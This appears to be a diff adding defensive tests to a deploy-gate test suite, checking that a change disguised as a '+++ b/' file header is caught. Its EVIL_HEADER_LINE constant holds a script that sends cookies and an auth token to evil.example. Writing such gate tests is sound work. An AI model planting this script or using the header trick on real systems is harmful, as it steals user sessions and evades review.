@@ -63,3 +63,32 @@ test('rollback: a deploy whose post-deploy live check fails is reverted and the 
   assert.equal((await fetch(`http://127.0.0.1:${(await import('../src/paths.js')).APP_PORT}/health`)).ok, true);
   await stopLive(); await closeBrowser();
 });
+
+// Reviewer payload: an added line whose content starts with "++ b/<allowlisted path>" looks like a file header to a
+// naive parser, but `git apply --recount` writes it. The gate must see it as an added line.
+const EVIL_HEADER_LINE = "++ b/public/index.html <script>fetch('https://evil.example/x?c='+document.cookie+localStorage.getItem('authToken'))</script>";
+test('blocks: added line disguised as a "+++ b/<allowlisted>" header inside a hunk', () => {
+  const idx = fs.readFileSync('app/public/index.html', 'utf8').split('\n');
+  const diff = `--- a/public/index.html\n+++ b/public/index.html\n@@ -10,3 +10,4 @@\n ${idx[9]}\n ${idx[10]}\n+${EVIL_HEADER_LINE}\n ${idx[11]}\n`;
+  const r = checkDiff(diff);
+  assert.equal(r.ok, false); assert.equal(r.changedLines, 1); assert.match(r.reasons.join(), /forbidden identifier/);
+  const many = `--- a/public/app.js\n+++ b/public/app.js\n@@ -1,1 +1,40 @@\n-a\n${Array.from({ length: 40 }, (_, i) => `+++ b/public/app.js x${i}`).join('\n')}\n`;
+  assert.match(checkDiff(many).reasons.join(), /too many changed lines/);
+  const rm = `--- a/public/app.js\n+++ b/public/app.js\n@@ -1,1 +1,1 @@\n--- a/public/app.js isAdmin\n+x\n`;
+  assert.equal(checkDiff(rm).ok, false);
+});
+test('post-apply content check sees what really changed on disk, independent of the diff text', async () => {
+  const { checkTreeDiff } = await import('../src/gate.js');
+  const { treeDiff } = await import('../src/shipper.js');
+  const tmp = fs.mkdtempSync('.gate-tree-');
+  try {
+    fs.mkdirSync(`${tmp}/a/public`, { recursive: true }); fs.mkdirSync(`${tmp}/b/public`, { recursive: true });
+    const orig = fs.readFileSync('app/public/index.html', 'utf8');
+    fs.writeFileSync(`${tmp}/a/public/index.html`, orig);
+    fs.writeFileSync(`${tmp}/b/public/index.html`, orig.replace('</body>', `${EVIL_HEADER_LINE}\n</body>`));
+    const r = checkTreeDiff(await treeDiff(['public/index.html'], `${tmp}/a`, `${tmp}/b`));
+    assert.equal(r.ok, false); assert.match(r.reasons.join(), /forbidden identifier/);
+    fs.writeFileSync(`${tmp}/b/public/index.html`, orig.replace('</body>', '<p>ok</p>\n</body>'));
+    assert.equal(checkTreeDiff(await treeDiff(['public/index.html'], `${tmp}/a`, `${tmp}/b`)).ok, true);
+  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
+});
